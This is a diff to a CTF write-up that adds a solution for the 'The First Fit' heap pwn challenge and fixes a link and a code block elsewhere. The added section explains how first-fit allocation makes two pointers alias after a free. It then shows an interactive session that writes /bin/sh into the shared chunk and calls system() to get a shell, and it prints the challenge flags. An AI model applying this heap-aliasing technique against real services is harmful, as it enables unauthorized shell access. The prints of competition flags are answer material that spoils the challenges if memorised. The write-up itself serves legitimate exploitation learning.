@@ -22,7 +22,7 @@ Challenge | Category | Points | Solves | Comments
 [Vacation](#vacation-forensics-100-pts) | Forensics | 100 | 339
 [Lines](#lines-crypto-150-pts) | Crypto | 150 | 128
 [Normal](#normal-reversing-150-pts) | Reversing | 150 | 109 | verilog
-The First Fit | Pwn | 150 | 139
+[The First Fit](#the-first-fit-pwn-150-pts) | Pwn | 150 | 139
 Jumprope | Reversing | 200 | 47
 No Thoughts, Head Empty | Reversing | 200 | 101
 linonophobia | Pwn | 200 | 70
@@ -215,7 +215,7 @@ The title and the description talks about flip flops. Might be something related
 So, we need 2 blocks: the "previous block" that will be used to flip a bit (of course, this block will not be recovered as the ciphertext changed), and the "next block" that contains a string that's 1 bit off from the string 'gimmeflag'. We can use the string `AAAAAAAAAAAAAAAAAAAAAAAgimmeflaf`. Since `f` is `0x66` and `g` is `0x67`, we can just flip the bottom-most bit of the first block of the ciphertext to recover `AAAAAAAAAAAAAAAAAAAAAAAgimmeflag`.
 
 ```
-$ ictf{fl1p_fl0p_b1ts_fl1pped_b6731f96}
+$ nc chal.imaginaryctf.org 42011
 
                                         ,,~~~~~~,,..
                              ...., ,'~             |
@@ -487,7 +487,77 @@ Out: b'ictf{A11_ha!1_th3_n3w_n0rm_n0r!}'
 ictf{A11_ha!1_th3_n3w_n0rm_n0r!}
 ```
 
-## The First Fit | Pwn | 150
+## The First Fit (Pwn, 150 pts)
+
+**Description**
+
+Let's get started with a simple heap exploit!
+
+**Attachments**
+
+[the_first_fit](_Attachments/the_first_fit)
+
+[the_first_fit.c](_Attachments/the_first_fit.c)
+
+**Solution**
+
+Looking at the source code, `a` is already malloc'd, and we have 4 options:
+    1. Malloc; malloc 128 bytes, and assign it to a or b
+    2. Free; free a or b
+    3. Fill a; put input into wherever `a` is pointing
+    4. System b; call `system(b)`
+
+The name of the challenge suggests that the way blocks are allocated is first-fit, and since it this code always allocates 128 bytes, it will be the case that freeing `a` and malloc-ing `b` will make `a` and `b` point to the same address on the heap; then really, the third option becomes fill b, so we can basically do `system` on anything.
+
+```
+$ nc chal.imaginaryctf.org 42003
+a is at 0x564dc92312a0
+b is at 0x7fff41f3bba0
+1: Malloc
+2: Free
+3: Fill a
+4: System b
+> 2
+What do I free?
+(1) a
+(2) b
+>> 1
+a is at 0x564dc92312a0
+b is at 0x7fff41f3bba0
+1: Malloc
+2: Free
+3: Fill a
+4: System b
+> 1
+What do I malloc?
+(1) a
+(2) b
+>> 2
+a is at 0x564dc92312a0
+b is at 0x564dc92312a0
+1: Malloc
+2: Free
+3: Fill a
+4: System b
+> 3
+>> /bin/sh
+a is at 0x564dc92312a0
+b is at 0x564dc92312a0
+1: Malloc
+2: Free
+3: Fill a
+4: System b
+> 4
+$
+```
+
+and voila, we have the shell.
+
+**Flag**
+```
+ictf{w3lc0me_t0_h34p_24bd59b0}
+```
+
 ## Jumprope | Reversing | 200
 ## No Thoughts, Head Empty | Reversing | 200
 ## linonophobia | Pwn | 200
